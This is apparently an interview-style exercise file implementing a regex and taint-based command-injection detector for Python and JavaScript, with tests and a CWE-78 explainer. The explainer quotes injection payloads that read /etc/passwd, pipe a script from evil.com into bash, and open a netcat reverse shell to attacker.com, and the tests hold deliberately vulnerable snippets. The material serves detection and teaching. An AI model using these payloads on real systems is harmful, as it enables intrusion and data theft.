"""
=============================================================================
Q50 [Hard] — Command Injection Static Pattern Detector
=============================================================================

PROBLEM
-------
Build a static analyzer for unsafe shell command construction:
  1. User-controlled input passed to os.system, subprocess.run/call/Popen,
     exec(), eval(), os.popen, shell=True with user data.
  2. String concatenation/interpolation to build shell commands.
  3. JavaScript: exec(), spawn(), child_process, eval().
  4. Taint tracking: user source → shell sink.

CLARIFYING QUESTIONS
--------------------
1. Languages? → Python, JavaScript, Java-like.
2. What is "safe"?
   → subprocess.run(["cmd", arg]) with list form (no shell=True),
     shlex.quote() applied to all user inputs,
     no shell=True, no os.system.
3. Severity levels?
   → HIGH: direct user input in shell sink; MEDIUM: dynamic expression;
     LOW: shell=True with no visible user input.
4. Output? → Structured findings.

=============================================================================
APPROACH 1 — NAIVE
=============================================================================
  Flag every os.system / subprocess call. Too many false positives.

=============================================================================
APPROACH 2 — TAINT-AWARE DETECTOR WITH SAFE-LIST SUPPRESSION (OPTIMAL)
=============================================================================
  Same 3-pass architecture as Q49:
  1. Collect tainted variables.
  2. Collect command-string variables built from tainted sources.
  3. Flag sinks with tainted variables or dynamic expressions.
  4. Suppress when shlex.quote() / shlex.split() / list-form detected.

=============================================================================
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# Data Types
# ---------------------------------------------------------------------------

@dataclass
class CmdiFinding:
    file: str
    line_number: int
    severity: str
    rule_name: str
    evidence: str
    line_preview: str

    def __str__(self) -> str:
        return (
            f"[{self.severity.upper()}] {self.file}:{self.line_number} "
            f"rule={self.rule_name!r}: {self.evidence[:60]}"
        )


@dataclass
class CmdiScanResult:
    filename: str
    findings: List[CmdiFinding] = field(default_factory=list)
    lines_scanned: int = 0

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)


# ---------------------------------------------------------------------------
# Patterns
# ---------------------------------------------------------------------------

_SOURCE_PATTERNS: List[Tuple[str, re.Pattern]] = [
    ("flask_args",  re.compile(r"request\.(args|form|values|GET|POST|json)(\[|\.get\s*\()")),
    ("input_func",  re.compile(r"\binput\s*\(")),
    ("sys_argv",    re.compile(r"\bsys\.argv\b")),
    ("req_query",   re.compile(r"req\.(query|body|params)\s*[\[.]")),
    ("cli_args",    re.compile(r"\bargparse\b|\bclick\b")),
    ("env_var",     re.compile(r"os\.environ\.get|os\.getenv")),
]

_SHELL_SINKS: List[Tuple[str, re.Pattern]] = [
    ("os_system",       re.compile(r"\bos\.system\s*\(")),
    ("os_popen",        re.compile(r"\bos\.popen\s*\(")),
    ("popen2",          re.compile(r"\bpopen2?\s*\(")),
    ("subprocess_run",  re.compile(r"\bsubprocess\.(run|call|check_output|check_call)\s*\(")),
    ("subprocess_popen",re.compile(r"\bsubprocess\.Popen\s*\(")),
    ("eval_exec",       re.compile(r"\b(eval|exec)\s*\(")),
    ("js_exec",         re.compile(r"\bexec\s*\(")),
    ("child_process",   re.compile(r"child_process\.(exec|spawn|execSync)\s*\(")),
    ("runtime_exec",    re.compile(r"Runtime\.getRuntime\(\)\.exec\s*\(")),
]

# Dangerous shell=True or string-form indicators
_SHELL_TRUE = re.compile(r"shell\s*=\s*True")
_DYN_EXPR   = re.compile(r'f["\']|\+\s*\w|\w\s*\+|%\s*(?:\w|[(\[])|\.format\s*\(|\$\{|\$\(')

# Safe patterns
_SAFE_PATTERNS: List[re.Pattern] = [
    re.compile(r"shlex\.quote\s*\("),            # safe quoting
    re.compile(r"shlex\.split\s*\("),            # tokenize safely
    re.compile(r"subprocess\.\w+\s*\(\s*\["),   # list-form arg
    re.compile(r"^\s*#"),                        # comment
    re.compile(r"#\s*(nosec|noqa|safe)"),
]

_VAR_FROM_SOURCE = re.compile(
    r"^\s*(\w+)\s*=\s*.*(?:request\.|req\.|input\(|sys\.argv|getenv|environ)",
    re.IGNORECASE,
)
_CMD_VAR_ASSIGN = re.compile(
    r"^\s*(\w+)\s*=\s*.*(?:sh|cmd|command|exec|run|shell)",
    re.IGNORECASE,
)


def _line_is_safe(line: str) -> bool:
    return any(p.search(line) for p in _SAFE_PATTERNS)


def _source_on_line(line: str) -> Optional[str]:
    for name, pat in _SOURCE_PATTERNS:
        if pat.search(line):
            return name
    return None


def _sink_on_line(line: str) -> Optional[Tuple[str, str]]:
    for name, pat in _SHELL_SINKS:
        m = pat.search(line)
        if m:
            return name, m.group(0)
    return None


# ---------------------------------------------------------------------------
# APPROACH 1 — Naive
# ---------------------------------------------------------------------------

def detect_naive(code: str) -> List[str]:
    results = []
    for i, line in enumerate(code.splitlines(), 1):
        if re.search(r"os\.system|subprocess|exec\(", line):
            results.append(f"Line {i}: {line.strip()}")
    return results


# ---------------------------------------------------------------------------
# APPROACH 2 — Taint-aware detector
# ---------------------------------------------------------------------------

class CmdInjectionDetector:
    """
    Heuristic command injection static detector.
    """

    def detect(self, code: str, filename: str = "<code>") -> CmdiScanResult:
        result = CmdiScanResult(filename=filename)
        lines  = code.splitlines()
        result.lines_scanned = len(lines)

        # Pass 1: tainted variables
        tainted: Set[str] = set()
        for line in lines:
            m = _VAR_FROM_SOURCE.match(line)
            if m:
                tainted.add(m.group(1))

        # Pass 2: command string variables
        cmd_vars: Dict[str, bool] = {}   # var → is_tainted
        for line in lines:
            m = _CMD_VAR_ASSIGN.match(line)
            if m:
                var = m.group(1)
                is_tainted_cmd = any(
                    re.search(r'\b' + re.escape(tv) + r'\b', line) for tv in tainted
                )
                cmd_vars[var] = is_tainted_cmd

        # Pass 3: find sinks
        for line_idx, line in enumerate(lines, start=1):
            if _line_is_safe(line):
                continue

            sink = _sink_on_line(line)
            if sink is None:
                continue

            sink_name, sink_text = sink

            # Direct source in sink
            src = _source_on_line(line)
            if src:
                result.findings.append(CmdiFinding(
                    file=filename, line_number=line_idx,
                    severity="high",
                    rule_name=f"{src}_to_{sink_name}",
                    evidence=line.strip()[:80],
                    line_preview=line.strip()[:100],
                ))
                continue

            # Tainted var in sink
            matched_tv = next(
                (tv for tv in tainted
                 if re.search(r'\b' + re.escape(tv) + r'\b', line)),
                None
            )
            if matched_tv:
                result.findings.append(CmdiFinding(
                    file=filename, line_number=line_idx,
                    severity="high",
                    rule_name=f"tainted_var_{sink_name}",
                    evidence=f"var={matched_tv}",
                    line_preview=line.strip()[:100],
                ))
                continue

            # Tainted cmd var in sink
            matched_cv = next(
                (cv for cv, tainted_flag in cmd_vars.items()
                 if tainted_flag and re.search(r'\b' + re.escape(cv) + r'\b', line)),
                None
            )
            if matched_cv:
                result.findings.append(CmdiFinding(
                    file=filename, line_number=line_idx,
                    severity="high",
                    rule_name=f"tainted_cmd_var_{sink_name}",
                    evidence=f"cmd_var={matched_cv}",
                    line_preview=line.strip()[:100],
                ))
                continue

            # Dynamic expression with shell=True → medium
            if _SHELL_TRUE.search(line) and _DYN_EXPR.search(line):
                result.findings.append(CmdiFinding(
                    file=filename, line_number=line_idx,
                    severity="medium",
                    rule_name=f"shell_true_dynamic_{sink_name}",
                    evidence=line.strip()[:80],
                    line_preview=line.strip()[:100],
                ))
                continue

            # shell=True at all (low) if untainted
            if _SHELL_TRUE.search(line):
                result.findings.append(CmdiFinding(
                    file=filename, line_number=line_idx,
                    severity="low",
                    rule_name=f"shell_true_{sink_name}",
                    evidence=line.strip()[:80],
                    line_preview=line.strip()[:100],
                ))

        return result

# Test Cases
# ---------------------------------------------------------------------------

def test_os_system_user_input():
    code = """
import os
from flask import request
host = request.args.get("host")
os.system("ping -c 1 " + host)
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "ping.py")
    print(f"os.system findings: {[str(f) for f in r.findings]}")
    assert r.has_findings
    high = [f for f in r.findings if f.severity == "high"]
    assert high
    print("os.system user input: passed")


def test_subprocess_list_form_safe():
    code = """
import subprocess
host = "192.168.1.1"
subprocess.run(["ping", "-c", "1", host], timeout=5)
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "safe.py")
    assert not r.has_findings
    print("subprocess list-form not flagged: passed")


def test_shell_true_dynamic():
    code = """
import subprocess
filename = user_input
subprocess.run(f"cat {filename}", shell=True)
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "shell_true.py")
    print(f"shell=True findings: {[str(f) for f in r.findings]}")
    assert r.has_findings
    print("shell=True dynamic: passed")


def test_js_child_process():
    code = """
const { exec } = require('child_process');
const cmd = req.query.cmd;
exec(cmd, (err, stdout) => { res.send(stdout); });
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "server.js")
    print(f"JS child_process findings: {[str(f) for f in r.findings]}")
    assert r.has_findings
    print("JS child_process: passed")


def test_shlex_quoted_safe():
    code = """
import subprocess, shlex
from flask import request
filename = shlex.quote(request.args.get("file"))
subprocess.run(["cat", filename])
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "quoted.py")
    # shlex.quote suppresses; list form also suppresses
    high = [f for f in r.findings if f.severity == "high"]
    assert not high
    print("shlex.quote not flagged high: passed")


def test_eval_injection():
    code = """
from flask import request
data = request.args.get("expr")
result = eval(data)
"""
    d = CmdInjectionDetector()
    r = d.detect(code, "eval_test.py")
    print(f"eval findings: {[str(f) for f in r.findings]}")
    assert r.has_findings
    print("eval injection: passed")

# SECURITY ANGLE

"""
COMMAND INJECTION — CWE-78 / OWASP A1
---------------------------------------
Root Cause: Unsanitized user input treated as OS shell command.

CLASSIC ATTACKS
----------------
  ping -c 1 <host>  where host = "8.8.8.8; cat /etc/passwd"
  Result: runs both ping AND cat /etc/passwd.

  host = "$(curl http://evil.com/shell.sh | bash)"
  host = "| nc attacker.com 4444 -e /bin/sh"

PYTHON-SPECIFIC DANGERS
------------------------
  os.system(cmd)         → spawns shell; all metacharacters active.
  subprocess(shell=True) → same as os.system.
  eval(user_input)       → arbitrary Python execution.
  exec(user_input)       → arbitrary Python execution.
  __import__             → module loading via injection.

SAFE ALTERNATIVES
-----------------
  subprocess.run(["cmd", arg1, arg2])  → no shell; args not interpreted.
  shlex.quote(arg)                     → escapes for POSIX shell.
  Never use shell=True with user-controlled data.
  Validate input against a strict allowlist before any command.

DEFENSE IN DEPTH
----------------
  Drop privileges (non-root process).
  SELinux/AppArmor policy restricts syscalls.
  No outbound network access from compute nodes.
  Audit log all exec() syscalls via auditd or eBPF.
"""
